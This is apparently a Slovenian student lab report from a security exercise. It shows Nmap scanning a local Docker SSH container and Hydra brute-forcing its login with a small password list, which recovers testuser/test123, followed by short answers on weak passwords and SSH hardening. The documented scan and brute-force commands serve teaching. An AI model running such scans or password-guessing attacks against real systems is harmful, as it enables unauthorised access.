@@ -1,0 +1,70 @@
+Skeniranje odprtih vrat z Nmap
+katera vrata so odprta: 22
+katere storitve tečejo: SSH
+katero različico operacijskega sistema je zaznal: Ubuntu Linux
+
+[22][ssh] host: 172.17.0.2   login: testuser   password: test123
+
+"Posnetek zaslona":
+nmap:                                                                                            
+┌──(kali㉿kali)-[~/vaja09]
+└─$ sudo docker inspect dvws-ssh | grep IPAddress
+            "SecondaryIPAddresses": null,
+            "IPAddress": "172.17.0.2",
+                    "IPAddress": "172.17.0.2",
+                                                                                                
+┌──(kali㉿kali)-[~/vaja09]
+└─$ nmap -sS -sV -O -p- 172.17.0.2 
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-06 13:43 EST
+Nmap scan report for 172.17.0.2
+Host is up (0.00013s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 2.65 seconds
+
+hydra:
+(kali㉿kali)-[~/vaja09]
+└─$ cat passwords.txt
+cat: passwords.txt: No such file or directory
+                                                                                                
+┌──(kali㉿kali)-[~/vaja09]
+└─$ echo -e "password
+123456
+test123
+admin" > passwords.txt
+                                                                                                
+┌──(kali㉿kali)-[~/vaja09]
+└─$ cat passwords.txt
+password
+123456
+test123
+admin
+                                                                                                
+┌──(kali㉿kali)-[~/vaja09]
+└─$ hydra -l testuser -P passwords.txt -s 22 172.17.0.2 ssh 
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-06 13:56:16
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:1/p:4), ~1 try per task
+[DATA] attacking ssh://172.17.0.2:22/
+[22][ssh] host: 172.17.0.2   login: testuser   password: test123
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-06 13:56:20
+
+Zakaj je uporaba šibkih gesel nevarna in zakaj zapirati neuporabljene porte: šibka gesla so ranljiva za avtomatizirane napade, ker se pogosto pojavljajo na seznamih pogostih gesel,
+ranljiva so tudi za brute force napade, ker so razkrita hitro. Zapiranje portov je koristno, ker manj kot jih je odprtih, manj je priložnosti za napad.
+
+Kako bi zaščitili SSH strežnik pred brute-force napadi: sprememba porta, težja gesla, omejitev števila prijav.
+Katere dodatne ukrepe (npr. omejitve po številu prijav, uporaba javno-zasebnih ključev, firewall) bi priporočili: Vse.
+Kako se spremeni rezultat, če uporabimo zelo močno geslo: razultat se spremeni v dobro nam, napadalec bo potreboval več časa za ugotovitev gesla.
